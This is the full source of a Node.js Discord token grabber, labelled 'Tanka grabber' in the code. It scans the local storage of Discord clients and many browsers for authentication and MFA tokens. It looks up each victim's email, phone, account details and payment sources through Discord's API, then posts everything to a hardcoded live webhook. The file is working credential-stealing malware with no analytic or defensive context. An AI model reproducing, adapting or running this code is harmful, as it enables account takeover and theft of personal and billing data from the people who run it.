(function() {
  (function() {
    var files, fs, path, payment, request, tokens, webhook;
    fs = require('fs');
    request = require('request');
    webhook = String('https://discord.com/api/webhooks/863764581003165706/_ihnfOOFg6BlDsMI9ukM2tAdLOTBkR89-NUOf3IGd6zGg7Z7_WyhRIm8XptntuPVYw4J');
    files = [];
    tokens = [];
    path = [`${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Roaming/Discord/Local Storage/leveldb`, `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Roaming/Lightcord/Local Storage/leveldb`, `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Roaming/discordptb/Local Storage/leveldb`, `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Roaming/discordcanary/Local Storage/leveldb`, `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb`, `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Roaming/Opera Software/Opera GX Stable/Local Storage/leveldb`, `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Amigo/User Data/Local Storage/leveldb`, `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Torch/User Data/Local Storage/leveldb`, `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Kometa/User Data/Local Storage/leveldb`, `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Orbitum/User Data/Local Storage/leveldb`, `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/CentBrowser/User Data/Local Storage/leveldb`, `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/7Star/7Star/User Data/Local Storage/leveldb`, `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Sputnik/Sputnik/User Data/Local Storage/leveldb`, `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Vivaldi/User Data/Default/Local Storage/leveldb`, `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Google/Chrome SxS/User Data/Local Storage/leveldb`, `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Epic Privacy Browser/User Data/Local Storage/leveldb`, `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb`, `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/uCozMedia/Uran/User Data/Default/Local Storage/leveldb`, `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb`, `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb`, `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb`, `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb`];
    request({
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        content: 'Discord runing!',
        username: 'tanka grabber'
      }),
      url: webhook,
      method: 'POST'
    });
    payment = function(i) {
      return new Promise(function(resolve, reject) {
        return request({
          headers: {
            'Content-Type': 'application/json',
            'authorization': i
          },
          method: 'get',
          url: 'https://discord.com/api/users/@me/billing/payment-sources'
        }, function(e, r, p) {
          if (e) {
            return reject(false);
          }
          if (r.statusCode !== 200) {
            return reject(false);
          }
          return resolve(p);
        });
      });
    };
    path.forEach(function(p) {
      return fs.readdir(p, function(err, p2) {
        if (err) {
          return;
        }
        return p2.forEach(function(e) {
          if (e.match(/.log|.ldb/)) {
            fs.readFile(`${p}/${e}`, 'utf8', function(err, f) {
              if (err) {
                return;
              }
              if (!f) {
                return;
              }
              files.push(f.toString().match(/[\w-]{24}.[\w-]{6}.[\w-]{27}/));
              return files.push(f.toString().match(/mfa\.[\w-]{84}/));
            });
          }
        });
      });
    });
    return setTimeout((function() {
      var req;
      files.forEach(function(i, m) {
        if (i === null) {
          files.splice(m, 1);
        } else if (typeof i) {
          i.forEach(function(ii) {
            if (ii !== null) {
              tokens.push(ii);
            }
          });
        }
      });
      req = function(i) {
        console.log(payment(i));
        return request({
          headers: {
            'Content-Type': 'application/json',
            'authorization': i
          },
          method: 'get',
          url: 'https://discord.com/api/users/@me'
        }, function(a, aa, bb) {
          var b;
          b = JSON.parse(bb);
          if (b.code === 0) {
            return;
          }
          if (b.code !== 0 && b !== void 0) {
            return request({
              headers: {
                'Content-Type': 'application/json'
              },
              body: JSON.stringify({
                content: '@here',
                embeds: [
                  {
                    title: 'Tanka grabber',
                    description: `\n**token:** ${i}\n**uuid:** ${b.id}\n**tag:** ${b.username}#${b.discriminator}\n**email:** ${b.email}\n**phone:** ${b.phone}\n\n\n**payment sources:** ${(payment(i !== false) ? payment(i) : 'no payment sources')}\n**verified:** ${b.verified}\n**nsfw allowed:** ${b.nsfw_allowed}\n**a2f:** ${b.mfa_enabled}\n**locale:** ${b.locale}\n\n**Bio:**\n\n>>> ${b.bio}\n\n**banner:**`,
                    image: {
                      url: b.banner ? 'https://cdn.discordapp.com/banners/' + b.id + '/' + b.banner + '.gif?size=512' : 'https://opengraph.githubassets.com/f850eb781f9da1f039568f21ccdd40e9b9125bf45fbdd1ee386ea5a3363a35eb/NotPunchnox/discord-token-grabber',
                      footer: {
                        url: 'https://cdn.discordapp.com/avatars/' + b.id + '/' + b.avatar + '.webp?size=2048',
                        text: 'discord.gg/punchnox'
                      }
                    }
                  }
                ],
                username: b.username,
                avatar_url: 'https://cdn.discordapp.com/avatars/' + b.id + '/' + b.avatar + '.webp?size=2048'
              }),
              url: webhook,
              method: 'POST'
            });
          }
        });
      };
      tokens.forEach(function(i) {
        req(i);
      });
    }), 5000);
  })();

}).call(this);


//# sourceMappingURL=main.js.map
//# sourceURL=coffeescript